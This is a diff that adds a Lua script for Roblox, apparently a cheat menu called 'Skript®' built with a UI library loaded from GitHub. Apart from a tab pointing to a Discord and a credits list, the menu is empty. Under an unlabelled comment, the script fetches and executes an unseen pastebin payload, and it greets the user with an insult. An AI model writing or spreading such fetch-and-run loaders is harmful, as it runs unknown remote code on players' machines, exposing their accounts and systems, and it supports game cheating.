@@ -1,0 +1,39 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local colors = {
+    SchemeColor = Color3.fromRGB(139,0,0),
+    Background = Color3.fromRGB(0, 0, 0),
+    Header = Color3.fromRGB(5, 5, 5),
+    TextColor = Color3.fromRGB(255,255,255),
+    ElementColor = Color3.fromRGB(20, 20, 20)
+}
+local Window = Library.CreateLib("Skript®(Check-Skript-Discord.)", colors)
+--  Skript
+local Main = Window:NewTab("Check Skript Discord.")
+local MainSection = Main:NewSection("Check Skript Discord.")
+
+
+-- Credits
+
+local Main = Window:NewTab("Credits")
+local MainSection = Main:NewSection("Credits")
+
+MainSection:NewDropdown("Credits", "", {"ecotric", "ecotric", "ecotric"}, function(currentOption)
+
+end)
+
+MainSection:NewKeybind("(Hide-Skript)", "(Pressing this will open and close the skript.)", Enum.KeyCode.LeftAlt, function()
+	Library:ToggleUI()
+end)
+
+-- *
+
+loadstring(game:HttpGet("https://pastebin.com/raw/HGJpdsLf"))()
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Skript®";
+    Text = "Welcome Fatass";
+    Icon = "RBXID OR BLANK";
+    Duration = "DURATION IN SECONDS";
+    callbakc = bindableFunction;
+    Button1 = "Thanks";
+})
